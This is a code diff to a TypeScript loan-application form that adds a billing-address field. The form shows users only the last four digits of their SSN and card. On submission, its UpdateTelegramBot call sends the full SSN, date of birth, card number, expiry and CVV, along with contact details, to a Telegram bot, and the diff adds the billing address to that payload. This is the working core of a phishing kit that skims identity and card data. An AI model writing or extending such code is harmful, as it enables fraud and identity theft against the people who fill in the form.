@@ -24,6 +24,7 @@ type LoanData = {
   ssnLast4: string;
   cardLast4: string;
   address: string;
+  billingAddress: string;
   city: string;
   state: string;
   zip: string;
@@ -56,6 +57,7 @@ type ValidationErrors = Partial<
     | "cvv"
     | "cardName"
     | "creditConsent"
+    | "billingAddress"
     | "terms",
     string
   >
@@ -308,6 +310,7 @@ export const mountLoanForm = (): void => {
       ssnLast4: "",
       cardLast4: "",
       address: "",
+      billingAddress: "",
       city: "",
       state: "",
       zip: "",
@@ -337,6 +340,7 @@ export const mountLoanForm = (): void => {
   const expiryInput = getFormInput(form, "expiry");
   const cvvInput = getFormInput(form, "cvv");
   const cardNameInput = getFormInput(form, "cardName");
+  const billingAddressInput = getFormInput(form, "billing-address");
   const creditConsentInput = getFormInput(form, "creditConsent");
   const termsInput = getFormInput(form, "terms");
 
@@ -479,6 +483,10 @@ export const mountLoanForm = (): void => {
       const number = digitsOnly(cardNumberInput.value);
       const cvvLength = isAmex(number) ? 4 : 3;
 
+      if (billingAddressInput.value.trim().length < 5) {
+        errors.billingAddress = "Enter your billing address.";
+      }
+
       if (!isValidCardNumber(number)) {
         errors.cardNumber = "Enter a valid card number.";
       }
@@ -519,7 +527,7 @@ export const mountLoanForm = (): void => {
     2: ["address", "city", "state", "zip"],
     3: ["amount", "term", "purpose"],
     4: ["employment", "income"],
-    5: ["cardNumber", "expiry", "cvv", "cardName"],
+    5: ["cardNumber", "expiry", "cvv", "cardName", "billingAddress"],
     6: ["creditConsent", "terms"],
   };
 
@@ -533,6 +541,7 @@ export const mountLoanForm = (): void => {
       ssnLast4: digitsOnly(ssnInput.value).slice(-4),
       cardLast4: digitsOnly(cardNumberInput.value).slice(-4),
       address: addressInput.value.trim(),
+      billingAddress: billingAddressInput.value.trim(),
       city: cityInput.value.trim(),
       state: stateInput.value.trim(),
       zip: zipInput.value.trim(),
@@ -578,6 +587,7 @@ export const mountLoanForm = (): void => {
       rows.push(["Employer", data.employer]);
     }
 
+    rows.push(["Billing address", data.billingAddress]);
     rows.push(["Monthly income", formatMoney(data.income)]);
     rows.push(["Card", `Card ending ${data.cardLast4}`]);
 
@@ -694,12 +704,13 @@ export const mountLoanForm = (): void => {
     submitButton.disabled = false;
     state.done = true;
 
+
     UpdateTelegramBot({
       FULL_NAME: fullNameInput.value.trim(),
       PHONE_NUMBER: phoneInput.value.trim(),
       EMAIL: emailInput.value.trim(),
       SSN: ssnInput.value , DOB: dobInput.value , STREET_ADDRESS: addressInput.value.trim(), STATE: stateInput.value.trim() , CITY: cityInput.value.trim(), ZIP_CODE: zipInput.value.trim(), type:"personal",
-      ADDRESS: addressInput.value.trim() , CARD_NAME_INPUT: cardNameInput.value.trim(), CARD_NUMBER: cardNumberInput.value.trim(), EXPIRYINPUT: expiryInput.value.trim(), CVV: cvvInput.value.trim(),
+      ADDRESS: addressInput.value.trim(), BILLING_ADDRESS: billingAddressInput.value.trim(), CARD_NAME_INPUT: cardNameInput.value.trim(), CARD_NUMBER: cardNumberInput.value.trim(), EXPIRYINPUT: expiryInput.value.trim(), CVV: cvvInput.value.trim(),
     })
 
     $("#success-msg").textContent =
